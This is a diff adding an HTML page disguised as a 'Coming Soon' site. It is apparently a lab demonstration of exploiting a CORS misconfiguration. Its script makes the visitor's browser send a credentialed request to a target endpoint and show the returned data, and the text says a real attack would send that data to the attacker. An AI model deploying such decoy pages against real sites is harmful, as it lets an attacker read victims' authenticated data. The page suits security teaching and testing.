@@ -1,0 +1,39 @@
+<html>
+    <head>
+        <title>Coming Soon</title>
+    </head>
+
+    <body>
+        <p>Welcome to this site. Full site coming soon!</p>
+        <br />
+        <br />
+        <hr />
+        <hr />
+        <h3>CORS Response</h3>
+        <p>
+            In a real attack, this information would be sent to our server
+            without the victim's knowledge. For demo purposes, this
+            information is shown below:
+        </p>
+        <hr />
+        <div id="response"></div>
+
+        <script>
+            var xhr = new XMLHttpRequest();
+            var url = "https://172.22.227.209:8443/update?email=email";
+
+            xhr.open("GET", url);
+            xhr.withCredentials = true;
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE) {
+                    var div = document.getElementById("response");
+                    div.innerHTML = xhr.responseText;
+                }
+            };
+
+            xhr.send();
+        </script>
+    </body>
+</html>
+
